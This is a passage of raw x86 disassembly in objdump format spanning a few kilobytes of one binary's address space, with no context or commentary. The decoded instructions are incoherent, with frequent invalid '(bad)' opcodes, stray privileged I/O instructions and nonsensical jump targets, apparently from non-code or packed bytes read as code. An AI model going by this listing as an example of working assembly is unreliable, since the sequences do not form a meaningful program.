  413841:	(bad)  
  413842:	mov    ebp,0x7f19e6b9
  413847:	mov    ah,0xfd
  413849:	dec    ebp
  41384b:	mov    ch,0xe6
  41384d:	adc    DWORD PTR [edi-0x4c],edi
  413850:	std    
  413851:	(bad)  
  413852:	mov    ebp,0x7f09e6e1
  413857:	mov    ah,0xfd
  413859:	dec    DWORD PTR [ebp+0x3f01e6b5]
  41385f:	fdivp  st(5),st
  413861:	inc    DWORD PTR [eax]
  413863:	jge    0x413846
  413865:	out    0x25,al
  413867:	sub    ecx,DWORD PTR ds:0x10dac900
  41386d:	add    BYTE PTR [ebp-0x7d],dl
  413870:	mov    al,0x7f
  413872:	(bad)  
  413873:	lock aad 0xfd
  413876:	call   DWORD PTR [ebp-0x79]
  413879:	cli    
  41387a:	push   eax
  41387b:	xchg   edi,eax
  41387c:	push   edi
  41387d:	or     bh,bh
  41387f:	cmp    eax,0xeb0fe815
  413884:	or     al,0x0
  413886:	or     ecx,DWORD PTR [eax-0x275a7af3]
  41388c:	or     al,0x0
  41388e:	(bad)  
  41388f:	or     eax,0xc8fffee5
  413894:	or     al,0xc7
  413896:	inc    ebp
  413897:	cmp    al,0xdd
  413899:	add    eax,0xfe329800
  41389e:	imul   ebx,DWORD PTR [eax+0x31ec838f],0x1fe53e7
  4138a8:	dec    esp
  4138a9:	add    cl,BYTE PTR [ebp-0x734cfa0c]
  4138af:	lods   al,BYTE PTR ds:[esi]
  4138b0:	dec    BYTE PTR [ebx-0x2]
  4138b3:	jle    0x413857
  4138b5:	push   ebx
  4138b6:	je     0x413931
  4138b8:	test   ebp,0x20ec59fb
  4138be:	add    BYTE PTR [ecx],dh
  4138c0:	cmp    eax,DWORD PTR [edx+0x73]
  4138c3:	xor    ecx,DWORD PTR [ebx]
  4138c5:	fld    QWORD PTR [edx+0x4a469400]
  4138cb:	dec    BYTE PTR [esi+0x31]
  4138ce:	into   
  4138cf:	add    al,0x46
  4138d1:	ins    DWORD PTR es:[edi],dx
  4138d2:	pop    edx
  4138d3:	jmp    0x373e:0xe77dad73
  4138da:	push   edx
  4138db:	dec    edi
  4138dc:	mov    esp,0x26f657b4
  4138e1:	addr16 mov bl,0xfe
  4138e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e5:	cs push ecx
  4138e7:	je     0x413912
  4138e9:	dec    edx
  4138ea:	cmp    BYTE PTR [eax],0xe
  4138ed:	dec    edi
  4138ee:	(bad)  
  4138ef:	mov    edi,0x847b437d
  4138f4:	add    DWORD PTR [edi+0x4089fe52],eax
  4138fa:	fld    QWORD PTR [eax+0x31]
  4138fd:	outs   dx,DWORD PTR ds:[esi]
  4138fe:	cwde   
  4138ff:	out    dx,eax
  413900:	fisub  WORD PTR [esi+0x5400e752]
  413906:	add    al,BYTE PTR [eax]
  413908:	sub    dh,BYTE PTR [edx-0x29]
  41390b:	or     eax,0xf65404ce
  413910:	mov    dh,0x52
  413913:	je     0x413936
  413915:	mov    dh,BYTE PTR [edi]
  413917:	sti    
  413918:	mov    dh,0xb6
  41391a:	push   edx
  41391b:	mov    ah,0xa1
  41391d:	or     BYTE PTR [esi+0x53],bl
  413920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413921:	xor    BYTE PTR [eax+0x55479e19],ch
  413927:	leave  
  413928:	sahf   
  413929:	xor    edx,eax
  41392b:	push   edx
  41392c:	add    BYTE PTR [edi-0x7526bab9],cl
  413932:	xor    BYTE PTR [ebp+eiz*1+0x46200931],bl
  413939:	sub    cl,BYTE PTR [ecx]
  41393b:	xchg   esp,eax
  41393c:	jle    0x413998
  41393e:	mov    ebp,DWORD PTR [eax+edx*2]
  413941:	fmul   DWORD PTR [eax]
  413943:	xchg   ebx,eax
  413944:	mov    dh,0x5f
  413946:	mov    ebp,0xfc005be0
  41394b:	or     eax,0x4cdb953
  413950:	push   ebx
  413951:	mov    ebp,0xc8479110
  413956:	leave  
  413957:	call   0xa0c036ae
  41395c:	les    ebp,FWORD PTR [esi]
  41395e:	das    
  41395f:	scas   al,BYTE PTR es:[edi]
  413960:	push   eax
  413961:	daa    
  413962:	inc    edi
  413963:	fstp   st(0)
  413965:	ss mov cl,0xac
  413968:	fnsave [ecx+0x9]
  41396b:	inc    ecx
  41396c:	push   es
  41396d:	xor    DWORD PTR [ecx],ecx
  41396f:	imul   ebx,DWORD PTR [ebx-0x3e],0xff52bd44
  413976:	mov    esp,0xb40bdbe0
  41397b:	daa    
  41397c:	add    al,0xee
  41397e:	cld    
  41397f:	pop    esi
  413980:	mov    ebx,0x5d910971
  413985:	fadd   QWORD PTR [esi-0x6b]
  413988:	push   edx
  413989:	pop    ebp
  41398a:	adc    DWORD PTR [ecx],eax
  41398c:	pop    edi
  41398d:	pop    eax
  41398e:	enter  0xdbe8,0x0
  413992:	xor    BYTE PTR [ecx],cl
  413994:	jmp    0xffa3101c
  413999:	jbe    0x4139fe
  41399b:	inc    edi
  41399c:	(bad)  
  41399d:	hlt    
  41399e:	inc    BYTE PTR [esi+0x74]
  4139a1:	icebp  
  4139a2:	or     al,BYTE PTR [esi]
  4139a4:	xor    ebx,DWORD PTR [esi+0x3]
  4139a7:	push   ecx
  4139a8:	shr    ebp,0x32
  4139ab:	fmul   QWORD PTR [edx-0x4b548c3]
  4139b1:	shl    DWORD PTR [edx],cl
  4139b3:	mov    bl,0x53
  4139b5:	ds pop ecx
  4139b7:	push   cs
  4139b8:	call   0xfe87560a
  4139bd:	pusha  
  4139be:	jns    0x413a02
  4139c0:	scas   al,BYTE PTR es:[di]
  4139c2:	xchg   ecx,ecx
  4139c4:	call   FWORD PTR ds:0x8de80e79
  4139ca:	push   es
  4139cb:	inc    edi
  4139cc:	dec    BYTE PTR [esi]
  4139ce:	imul   eax,DWORD PTR [edx-0x2],0xe2e4a7c
  4139d5:	mov    edx,0x2bc846e3
  4139da:	or     DWORD PTR cs:[ebp+0x62],edx
  4139de:	mov    cs,WORD PTR [ebx-0x21141a3d]
  4139e4:	imul   ebp,ecx,0x5cfedcfc
  4139ea:	adc    eax,0x601bb02e
  4139ef:	inc    edi
  4139f0:	mov    BYTE PTR [ecx+eiz*2],ch
  4139f3:	xchg   ebx,eax
  4139f4:	xor    al,0x3
  4139f6:	add    BYTE PTR [ebp+0x2661ffc8],bh
  4139fc:	pop    es
  4139fd:	dec    eax
  4139fe:	sub    BYTE PTR ds:0xfee93e89,dh
  413a04:	int3   
  413a05:	addr16 cs cld 
  413a08:	enter  0x3dff,0x75
  413a0c:	push   esp
  413a0d:	and    cl,ch
  413a0f:	xor    dl,BYTE PTR [edx]
  413a11:	rol    BYTE PTR [eax],0xc4
  413a14:	cmp    BYTE PTR [eax+ebp*8-0x16],dl
  413a18:	sbb    bh,bh
  413a1a:	call   FWORD PTR [eax]
  413a1c:	gs (bad) 
  413a1e:	jmp    FWORD PTR [edi]
  413a20:	fwait
  413a21:	push   si
  413a23:	or     DWORD PTR [edx-0x2],0x4f
  413a27:	call   FWORD PTR [ebp+0x6]
  413a2a:	call   0x3eb55d
  413a2f:	lock pop ds
  413a31:	xor    eax,0xffe3efff
  413a36:	inc    ebp
  413a37:	or     BYTE PTR [ebx],bl
  413a39:	add    BYTE PTR [ebp+0x42],dh
  413a3c:	push   ebx
  413a3d:	cli    
  413a3e:	xor    ebx,DWORD PTR [eax]
  413a40:	xchg   edx,eax
  413a41:	std    
  413a42:	dec    DWORD PTR [edi]
  413a44:	fdiv   st,st(0)
  413a46:	scas   al,BYTE PTR es:[edi]
  413a47:	push   eax
  413a48:	adc    BYTE PTR [ebp-0x45],dh
  413a4b:	aas    
  413a4c:	pop    esi
  413a4d:	cli    
  413a4e:	jmp    DWORD PTR [ebp-0x756c19bf]
  413a54:	fdivr  st,st(5)
  413a56:	pop    edi
  413a57:	sahf   
  413a58:	add    al,cl
  413a5a:	add    al,0x0
  413a5c:	dec    eax
  413a5d:	jle    0x4139e8
  413a5f:	in     al,dx
  413a60:	fwait
  413a61:	shl    esi,1
  413a63:	or     DWORD PTR [ebp+0x71],0x49
  413a67:	inc    ecx
  413a68:	or     BYTE PTR [ecx],cl
  413a6a:	jne    0x413a70
  413a6c:	ror    esi,1
  413a6e:	push   es
  413a6f:	add    BYTE PTR [eax+0xc],dh
  413a72:	add    DWORD PTR [eax],eax
  413a74:	sbb    cl,ah
  413a76:	pop    es
  413a77:	xor    eax,0x4587d9bf
  413a7c:	mov    esp,0xd4f843d1
  413a81:	pop    es
  413a82:	add    BYTE PTR [eax],al
  413a84:	pop    ebp
  413a85:	dec    ebx
  413a86:	not    BYTE PTR [eax-0x41]
  413a89:	pop    ebx
  413a8a:	cli    
  413a8b:	push   DWORD PTR [ecx]
  413a8d:	and    eax,0x6644ff00
  413a92:	dec    edi
  413a93:	adc    al,0x8d
  413a95:	test   edx,0x4e3dbfff
  413a9b:	out    0x92,eax
  413a9d:	pop    ebx
  413a9e:	add    al,BYTE PTR [eax]
  413aa0:	mov    dl,0xba
  413aa2:	add    esi,DWORD PTR [esi+0x3c]
  413aa5:	pop    edx
  413aa6:	add    al,BYTE PTR [eax]
  413aa8:	mov    fs,WORD PTR [edx+ebx*8+0x2710a61]
  413aaf:	inc    DWORD PTR [esi+edx*8]
  413ab2:	dec    edi
  413ab3:	je     0x413aee
  413ab5:	fisub  DWORD PTR [ebp+0x50037e5c]
  413abb:	je     0x413b32
  413abd:	retf   0x339b
  413ac0:	add    BYTE PTR [esi-0xd],ch
  413ac3:	cmp    ecx,eax
  413ac5:	cmp    DWORD PTR [edx],esi
  413ac7:	mov    ch,0x8a
  413ac9:	dec    ebp
  413aca:	scas   eax,DWORD PTR es:[edi]
  413acb:	inc    esi
  413acc:	sti    
  413acd:	retf   
  413ace:	xor    esp,ebx
  413ad0:	push   ebp
  413ad1:	dec    esi
  413ad2:	popf   
  413ad3:	cli    
  413ad4:	out    0x74,eax
  413ad6:	or     DWORD PTR [edi-0x2],0x674e6da8
  413add:	into   
  413ade:	xchg   cl,al
  413ae0:	jmp    FWORD PTR [edi]
  413ae2:	mov    ebp,0x2b9fe7fa
  413ae7:	dec    esi
  413ae8:	(bad)  
  413ae9:	push   ds
  413aea:	fisttp QWORD PTR [edi-0x2]
  413aed:	pushf  
  413aee:	sub    bl,BYTE PTR [edx-0x9]
  413af1:	inc    eax
  413af2:	push   ebx
  413af3:	dec    esi
  413af4:	enter  0x35f3,0x2
  413af8:	push   ebp
  413af9:	stos   BYTE PTR es:[edi],al
  413afa:	push   ebp
  413afb:	add    bl,0xf5
  413afe:	mov    DWORD PTR [ebx],0xd873866a
  413b04:	pop    es
  413b05:	(bad)  [eax]
  413b07:	test   DWORD PTR ds:0xc96f43de,edx
  413b0d:	fidiv  DWORD PTR [eax-0x7d21fc18]
  413b13:	add    BYTE PTR [esi+0x5b],bh
  413b16:	retf   0xdbe8
  413b19:	cdq    
  413b1a:	scas   eax,DWORD PTR es:[edi]
  413b1b:	daa    
  413b1c:	add    al,0xb6
  413b1e:	mov    ebp,0xe5b75be0
  413b23:	ins    DWORD PTR es:[edi],dx
  413b24:	dec    edi
  413b25:	add    BYTE PTR [edi+0x254f64bd],ah
  413b2b:	adc    DWORD PTR [ecx-0x6f],edx
  413b2e:	popa   
  413b2f:	inc    esp
  413b30:	push   ebp
  413b31:	cmp    eax,0xb8e90c70
  413b36:	mov    ebx,0x62486934
  413b3b:	ficom  DWORD PTR [ebp+0x4114fd4e]
  413b41:	cld    
  413b42:	sub    DWORD PTR [ebp+ebp*1-0x5],eax
  413b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b47:	mov    ebp,0x51fcaeee
  413b4c:	sub    bh,ah
  413b4e:	push   esi
  413b4f:	xchg   esp,eax
  413b50:	stos   DWORD PTR es:[edi],eax
  413b51:	push   ebx
  413b52:	inc    BYTE PTR [ebx-0x6d]
  413b55:	dec    DWORD PTR [esi-0x7f]
  413b58:	mov    edi,0x290f3f4e
  413b5d:	push   DWORD PTR [edx+0x3103e7df]
  413b63:	inc    edx
  413b64:	jae    0x413bb5
  413b66:	mov    bh,0xcc
  413b68:	les    esi,FWORD PTR [ecx*4-0x527229b]
  413b6f:	inc    edx
  413b70:	pop    ebx
  413b71:	dec    esp
  413b72:	push   ss
  413b73:	sub    DWORD PTR fs:[edi+0x7],ecx
  413b77:	pop    gs
  413b79:	xlat   BYTE PTR ds:[ebx]
  413b7a:	aaa    
  413b7b:	nop
  413b7c:	and    esp,DWORD PTR [eax-0x55]
  413b7f:	cmp    edi,edi
  413b81:	rcr    esi,0x43
  413b84:	je     0x413b33
  413b86:	mov    al,BYTE PTR [ebp+0x32]
  413b89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b8a:	add    BYTE PTR [edi-0x6f],ch
  413b8d:	inc    esp
  413b8e:	lea    esp,[edi-0x43]
  413b91:	sti    
  413b92:	xchg   esi,eax
  413b93:	jmp    0x755639c6
  413b98:	sub    ah,BYTE PTR [edx]
  413b9a:	mov    ebp,0xf48a436f
  413b9f:	push   esi
  413ba0:	xor    edi,ebx
  413ba2:	jmp    0xa40044d9
  413ba7:	mov    ecx,ecx
  413ba9:	(bad)  
  413baa:	mov    ebp,0x9462ae4
  413baf:	sub    eax,0x66290b09
  413bb4:	or     bl,ch
  413bb6:	cli    
  413bb7:	div    dh
  413bb9:	mov    edi,0xfe42ef80
  413bbe:	ds loopne 0x413c34
  413bc1:	aaa    
  413bc2:	out    dx,al
  413bc3:	mov    DWORD PTR ds:0x93221e8,ebp
  413bc9:	add    BYTE PTR [edx+0x2],dh
  413bcc:	stos   BYTE PTR es:[edi],al
  413bcd:	les    edx,FWORD PTR [edx+0x154426d]
  413bd3:	dec    edi
  413bd4:	and    al,BYTE PTR [eax]
  413bd6:	jmp    0xecb5be26
  413bdb:	fnsave [edi-0x1]
  413bde:	call   0xf9cc0515
  413be3:	stos   BYTE PTR es:[edi],al
  413be4:	mov    ebp,0xaf6f81e7
  413be9:	inc    eax
  413bea:	jmp    0x94765d3
  413bef:	add    BYTE PTR ds:0xe6a90b09,ch
  413bf5:	or     al,0xe9
  413bf7:	jno    0x413c26
  413bf9:	or     DWORD PTR [eax],eax
  413bfb:	add    BYTE PTR [edx+0x800c43d],al
  413c01:	jbe    0x413c53
  413c03:	jmp    FWORD PTR ds:0xf63fe6e5
  413c09:	add    eax,0x60880b00
  413c0e:	jb     0x413b99
  413c10:	or     eax,0xb075fdb1
  413c15:	in     al,0x1c
  413c17:	inc    ebx
  413c18:	mov    bh,0xd3
  413c1a:	xchg   DWORD PTR [ebp-0x58],eax
  413c1d:	shl    DWORD PTR [ebx-0x1c],cl
  413c20:	aaa    
  413c21:	pop    edx
  413c22:	fsubp  st(0),st
  413c24:	cwde   
  413c25:	dec    ecx
  413c26:	std    
  413c27:	call   DWORD PTR [ebx+0x594f72c5]
  413c2d:	(bad)  {k5}
  413c32:	imul   eax,DWORD PTR [ecx-0x68],0xf7d843c4
  413c39:	sbb    ecx,eax
  413c3b:	imul   ecx,ecx,0x5
  413c3e:	pop    DWORD PTR [ebp+0x1c]
  413c41:	ret    0xd443
  413c44:	enter  0x43c2,0xe4
  413c48:	enter  0x73d4,0xe0
  413c4c:	inc    eax
  413c4d:	ins    DWORD PTR es:[edi],dx
  413c4e:	pop    edx
  413c4f:	push   DWORD PTR [edi]
  413c51:	inc    eax
  413c52:	mov    esi,0x5d7e0074
  413c57:	(bad)  
  413c58:	inc    DWORD PTR [edi-0x6d]
  413c5b:	std    
  413c5c:	jne    0x413c9e
  413c5e:	ffree  st(1)
  413c60:	das    
  413c61:	aaa    
  413c62:	aam    0xfd
  413c64:	jne    0x413c96
  413c66:	into   
  413c67:	jae    0x413c71
  413c69:	xor    BYTE PTR [ebx],dh
  413c6b:	call   DWORD PTR cs:[edi]
  413c6e:	into   
  413c6f:	jae    0x413c55
  413c71:	not    DWORD PTR [edi-0x22]
  413c74:	push   DWORD PTR [ecx]
  413c76:	(bad)  
  413c78:	out    0x11,eax
  413c7a:	inc    eax
  413c7b:	dec    ebx
  413c7c:	(bad)  
  413c7d:	(bad)  
  413c7e:	std    
  413c7f:	arpl   di,sp
  413c81:	add    BYTE PTR [ebp+0x4b],al
  413c84:	dec    BYTE PTR [ebx+0x3a0f7c1a]
  413c8a:	js     0x413c62
  413c8c:	or     BYTE PTR [ecx-0x53f0fdd8],dh
  413c92:	inc    ebx
  413c93:	dec    ebx
  413c94:	dec    dh
  413c96:	or     al,BYTE PTR [edx]
  413c98:	add    dh,dl
  413c9a:	ror    BYTE PTR [ebx+0x74],1
  413c9d:	sub    DWORD PTR [edx-0x4049d17a],ebx
  413ca3:	dec    ebx
  413ca4:	je     0x413c53
  413ca6:	mov    bh,0xd5
  413ca8:	mul    DWORD PTR [esi-0x321805cb]
  413cae:	pop    ss
  413caf:	dec    ebp
  413cb0:	(bad)  
  413cb1:	xchg   esi,eax
  413cb2:	push   ebp
  413cb3:	pop    esi
  413cb4:	out    0xcc,eax
  413cb6:	and    al,0x4d
  413cb8:	inc    BYTE PTR [eax]
  413cba:	mov    ah,0x65
  413cbc:	push   edx
  413cbd:	dec    edi
  413cbe:	mov    esi,edx
  413cc0:	or     bh,bh
  413cc2:	jbe    0x413c9f
  413cc4:	add    bl,BYTE PTR [edi+0xf]
  413cc7:	jmp    0x9572440c
  413ccc:	ja     0x413cb9
  413cce:	pop    esi
  413ccf:	popf   
  413cd0:	(bad)  
  413cd1:	(bad)  
  413cd2:	fdivr  QWORD PTR [ecx]
  413cd4:	pop    edx
  413cd5:	bound  ecx,QWORD PTR [edi+0x17]
  413cd8:	dec    esp
  413cd9:	enter  0x5e73,0x2
  413cdd:	push   ebp
  413cde:	stos   BYTE PTR es:[edi],al
  413cdf:	push   ss
  413ce0:	dec    esp
  413ce1:	je     0x413d08
  413ce3:	sbb    ah,BYTE PTR [ebp+esi*1+0x2e]
  413ce7:	aaa    
  413ce8:	idiv   BYTE PTR [edi+0x744b539d]
  413cee:	inc    ecx
  413cef:	or     DWORD PTR [ecx],edi
  413cf1:	pop    esp
  413cf2:	popf   
  413cf3:	neg    ebp
  413cf5:	dec    ebx
  413cf6:	jle    0x413ca9
  413cf8:	fsub   QWORD PTR [ecx+0x46]
  413cfb:	or     esi,ecx
  413cfd:	shl    DWORD PTR [esi],1
  413cff:	inc    eax
  413d00:	cmp    esi,eax
  413d02:	inc    ax
  413d04:	xor    edi,esp
  413d06:	(bad)  
  413d07:	je     0x413d18
  413d09:	dec    ebx
  413d0a:	out    0x30,eax
  413d0c:	inc    eax
  413d0d:	push   ss
  413d0e:	fidivr WORD PTR [edi]
  413d10:	scas   eax,DWORD PTR es:[edi]
  413d11:	inc    esi
  413d12:	inc    edx
  413d13:	or     DWORD PTR [edi+edi*2],esi
  413d16:	fidiv  DWORD PTR [eax+0x7ed603e8]
  413d1c:	add    BYTE PTR [ecx-0x1735b500],bl
  413d22:	dec    edx
  413d23:	cmp    eax,0xafee130d
  413d28:	mov    ch,0xe0
  413d2a:	pop    ebx
  413d2b:	(bad)  
  413d2c:	aas    
  413d2d:	ins    DWORD PTR es:[edi],dx
  413d2e:	dec    ebx
  413d2f:	push   ss
  413d30:	or     ecx,ebp
  413d32:	pop    edx
  413d33:	aam    0xb0
  413d35:	mov    ebx,edi
  413d37:	icebp  
  413d38:	or     BYTE PTR [esi-0x2f],dl
  413d3b:	cmp    dh,BYTE PTR [ebx+0x11054aec]
  413d41:	push   ecx
  413d42:	ins    DWORD PTR es:[edi],dx
  413d43:	ja     0x413d84
  413d45:	cmp    eax,0x453f6edc
  413d4a:	mov    cl,dh
  413d4c:	ins    DWORD PTR es:[edi],dx
  413d4d:	rol    esp,0x5e
  413d50:	ds fwait
  413d52:	test   eax,0x36d11deb
  413d58:	xor    DWORD PTR [edx+0x4b],ebp
  413d5b:	inc    edi
  413d5c:	aas    
  413d5d:	pop    ds
  413d5e:	inc    esi
  413d5f:	or     DWORD PTR ss:[esi+edi*2-0x20d84fb6],ebx
  413d67:	jno    0x413d72
  413d69:	add    BYTE PTR [ecx-0x16bf4c46],al
  413d6f:	imul   esi,DWORD PTR [ebp+0x7741e60f],0x47
  413d76:	sub    BYTE PTR ds:0x7a1c1431,dh
  413d7c:	aas    
  413d7d:	or     ch,BYTE PTR [ecx-0x7b5cdc12]
  413d83:	add    bh,dl
  413d85:	leave  
  413d86:	(bad)  
  413d87:	mov    ebp,0x3cff1301
  413d8c:	in     eax,0x26
  413d8e:	test   BYTE PTR [esi-0x2301c095],ch
  413d94:	test   eax,0x6ae940b3
  413d99:	pop    esp
  413d9a:	xor    BYTE PTR [esi-0x223eae85],dl
  413da0:	xor    dl,ah
  413da2:	mov    dl,BYTE PTR [ebp+0x13fb4aaf]
  413da8:	xor    eax,0x817658b3
  413dad:	push   es
  413dae:	call   0xfe7f799c
  413db3:	jo     0x413e26
  413db5:	inc    edx
  413db6:	addr16 or eax,0xc0ffc969
  413dbc:	mov    esi,DWORD PTR [edx-0x4b1416c0]
  413dc2:	pop    es
  413dc3:	push   ecx
  413dc4:	pop    es
  413dc5:	aas    
  413dc6:	(bad)  
  413dc7:	ds sti 
  413dc9:	mov    ah,0xfb
  413dcb:	add    DWORD PTR ss:[esi],0x3e3a07e8
  413dd2:	(bad)  
  413dd3:	xor    ah,ch
  413dd5:	or     DWORD PTR [eax],eax
  413dd7:	mov    ah,0xcf
  413dd9:	xor    DWORD PTR [edx-0x5011d3],eax
  413ddf:	or     BYTE PTR [edx+0x4000743f],0xe2
  413de6:	enter  0x2e,0x2f
  413dea:	rol    BYTE PTR [edi+0x67631c45],1
  413df0:	ins    BYTE PTR es:[edi],dx
  413df1:	leave  
  413df2:	or     DWORD PTR [eax+0x51],ebp
  413df5:	jl     0x413e41
  413df7:	(bad)  
  413df8:	(bad)  
  413df9:	gs cmp eax,0xcfdf65e6
  413dff:	std    
  413e00:	jmp    DWORD PTR [ebp-0x2f]
  413e03:	std    
  413e04:	jne    0x413e06
  413e06:	loop   0x413df6
  413e08:	cs scas eax,DWORD PTR es:[edi]
  413e0a:	iret   
  413e0b:	mov    edx,0x8b5509d4
  413e11:	pushf  
  413e12:	add    edx,0xfffffffc
  413e15:	inc    edx
  413e16:	add    eax,0x4daf5a6a
  413e1b:	push   es
  413e1c:	call   0x406165
  413e21:	push   ecx
  413e22:	jle    0x413e1e
  413e24:	push   0xffffffc8
  413e26:	popa   
  413e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e28:	ins    BYTE PTR es:[edi],dx
  413e29:	pop    ecx
  413e2a:	add    eax,0x4a2c8968
  413e2f:	(bad)  
  413e30:	(bad)  
  413e31:	in     eax,0x97
  413e33:	inc    esi
  413e34:	inc    ecx
  413e35:	mov    cl,ah
  413e37:	pop    eax
  413e38:	xor    al,0xef
  413e3a:	iret   
  413e3b:	or     eax,eax
  413e3d:	xor    cl,BYTE PTR fs:[esi+0x68]
  413e41:	mov    BYTE PTR [ecx],cl
  413e43:	out    dx,eax
  413e44:	mov    esi,0x416a9260
  413e49:	pop    eax
  413e4a:	jns    0x413e49
  413e4c:	jne    0x413e4e
  413e4e:	push   eax
  413e4f:	loope  0x413e6b
  413e51:	pop    edx
  413e52:	(bad)  
  413e54:	out    0x25,al
  413e56:	jns    0x413e28
  413e58:	std    
  413e59:	push   0x58
  413e5b:	popa   
  413e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e5d:	ins    BYTE PTR es:[edi],dx
  413e5e:	xor    DWORD PTR [ecx+0x2],esi
  413e61:	push   0xffc1bba8
  413e66:	into   
  413e67:	xor    DWORD PTR [edx],eax
  413e69:	add    BYTE PTR [ecx+0x2634211a],dh
  413e6f:	xor    al,0xfb
  413e71:	mov    edi,0x67b259a5
  413e76:	xor    DWORD PTR [edx],esi
  413e78:	push   edi
  413e79:	mov    ebp,0x40d66999
  413e7e:	xor    DWORD PTR [edx],eax
  413e80:	dec    ecx
  413e81:	je     0x413eac
  413e83:	dec    edx
  413e84:	pop    ecx
  413e85:	pop    eax
  413e86:	test   BYTE PTR [ebx+0x5a],0xf1
  413e8a:	and    DWORD PTR [ebx+0x47],edi
  413e8d:	imul   esi,DWORD PTR [ecx],0x706b99ca
  413e93:	xor    bl,dl
  413e95:	mov    BYTE PTR [ebp-0xf],al
  413e98:	add    edi,edi
  413e9a:	add    al,0xd4
  413e9c:	mov    edx,0x538a3140
  413ea1:	xor    bh,BYTE PTR [esi+0x3dbffb8b]
  413ea7:	sub    DWORD PTR [edx+0x57323167],esi
  413ead:	mov    ebp,0x40d6f919
  413eb2:	add    BYTE PTR [ecx],dh
  413eb4:	and    cl,BYTE PTR [ecx+0x74]
  413eb7:	sub    edx,ebx
  413eb9:	lea    ebx,[eax-0x72]
  413ebc:	fistp  DWORD PTR [edx-0x43]
  413ebf:	inc    ecx
  413ec0:	rol    DWORD PTR [edi+0x69],cl
  413ec3:	xor    DWORD PTR [edx-0x68],ecx
  413ec6:	imul   esi,eax,0x31
  413ec9:	fimul  DWORD PTR [eax+0x680270dd]
  413ecf:	xor    esi,DWORD PTR [edx]
  413ed1:	add    al,BYTE PTR [eax-0xec0db7]
  413ed7:	push   esi
  413ed8:	or     edx,esi
  413eda:	inc    ebx
  413edb:	ret    0xb921
  413ede:	fild   DWORD PTR [esi+0x3c]
  413ee1:	add    eax,0x7c81d689
  413ee6:	ret    0xcc36
  413ee9:	add    eax,0x6a3136ce
  413eee:	stos   BYTE PTR es:[edi],al
  413eef:	daa    
  413ef0:	cmp    al,0x0
  413ef2:	jl     0x413f42
  413ef4:	cmp    al,0xed
  413ef6:	inc    edi
  413ef7:	popf   
  413ef8:	cmp    eax,0x3136d1e5
  413efd:	ficomp WORD PTR [ecx]
  413eff:	push   es
  413f00:	cmp    al,0x9f
  413f02:	inc    edx
  413f03:	xor    cl,BYTE PTR [ecx]
  413f05:	xor    al,0x7b
  413f07:	or     cl,BYTE PTR [edx+0x3be75cac]
  413f0d:	mov    ebp,0xe90a2ddc
  413f12:	add    ecx,ecx
  413f14:	mov    al,bh
  413f16:	inc    esi
  413f17:	add    bh,dl
  413f19:	xchg   ecx,eax
  413f1a:	imul   ebx,DWORD PTR [edi+eax*8+0x3b],0xffffff9d
  413f1f:	jns    0x413f8e
  413f21:	cmp    eax,0xd454738
  413f26:	mov    ss,ecx
  413f28:	xor    DWORD PTR cs:[esi-0x18],ebp
  413f2c:	scas   al,BYTE PTR es:[edi]
  413f2d:	cmp    esi,ecx
  413f2f:	inc    ebx
  413f30:	aaa    
  413f31:	xchg   cl,ah
  413f33:	add    al,0x31
  413f35:	or     DWORD PTR [esi-0x16f7613f],esp
  413f3b:	add    esi,DWORD PTR [ecx]
  413f3d:	inc    esp
  413f3e:	mov    ds:0xe903874f,eax
  413f43:	add    ecx,DWORD PTR [ebx]
  413f45:	or     ebx,eax
  413f47:	add    ecx,DWORD PTR [ebx]
  413f49:	or     ebx,edx
  413f4b:	add    edi,DWORD PTR [ebp+eax*8-0x7a4a4bcc]
  413f52:	(bad)  
  413f53:	cmp    al,0xee
  413f55:	cmp    bh,dh
  413f57:	cdq    
  413f58:	out    dx,eax
  413f59:	mov    ah,0xf7
  413f5b:	es pusha 
  413f5d:	aas    
  413f5e:	out    0xc1,eax
  413f60:	dec    esi
  413f61:	cmp    edi,esi
  413f63:	loop   0x413f57
  413f65:	mov    bh,0x4
  413f67:	add    bh,bh
  413f69:	cmp    edi,esi
  413f6b:	jmp    0xa888d87a
  413f70:	xor    bh,BYTE PTR [edx]
  413f72:	je     0x413f59
  413f74:	jp     0x413fe7
  413f76:	xor    ch,dh
  413f78:	outs   dx,DWORD PTR ds:[esi]
  413f79:	retf   0xb98a
  413f7c:	add    BYTE PTR [ecx+0x6fd6f385],cl
  413f82:	cmp    ecx,DWORD PTR [edi+0x3b]
  413f85:	pop    ebp
  413f86:	mov    eax,ds:0x916fce32
  413f8b:	test   BYTE PTR [ecx-0x2e01c481],bh
  413f91:	jg     0x413f7e
  413f93:	(bad)  
  413f94:	mov    dh,0xf8
  413f96:	cmp    ah,BYTE PTR [esi-0x72]
  413f99:	dec    cl
  413f9b:	jmp    DWORD PTR [ebp-0x6109d55f]
  413fa1:	outs   dx,DWORD PTR ds:[esi]
  413fa2:	cmp    esi,DWORD PTR [ecx+eiz*8+0x5a]
  413fa6:	cmp    BYTE PTR [ecx],dh
  413fa8:	mov    gs,WORD PTR [edi-0x6f]
  413fab:	test   BYTE PTR [ebp+0x6afe3aff],dl
  413fb1:	mov    ecx,0xf776f62e
  413fb6:	cmp    DWORD PTR [edx+0x1a],esi
  413fb9:	jne    0x413fe1
  413fbb:	imul   ebp,DWORD PTR [eax+0x4db43a32],0xfffffff7
  413fc2:	cmp    bh,dh
  413fc4:	inc    ecx
  413fc5:	enter  0xfef7,0x4e
  413fc9:	ret    0x67ca
  413fcc:	add    BYTE PTR [ebp+eax*1+0x0],bl
  413fd0:	add    BYTE PTR [edi],ah
  413fd2:	cdq    
  413fd3:	out    0xf7,al
  413fd5:	daa    
  413fd6:	ret    
  413fd7:	xchg   sp,ax
  413fd9:	nop
  413fda:	inc    ebp
  413fdb:	(bad)  
  413fdc:	addr16 adc al,0x52
  413fdf:	aas    
  413fe0:	add    BYTE PTR [eax],al
  413fe2:	mov    al,ds:0x48416aca
  413fe7:	fiadd  WORD PTR [eax+0x1b]
  413fea:	dec    eax
  413feb:	push   es
  413fec:	cmp    eax,0x1b
  413fef:	dec    esp
  413ff0:	push   ss
  413ff1:	push   0xbeef0618
  413ff6:	mov    al,0x8
  413ff8:	ins    DWORD PTR es:[edi],dx
  413ff9:	inc    ecx
  413ffa:	or     bl,al
  413ffc:	mov    bl,0xe8
  413ffe:	out    dx,eax
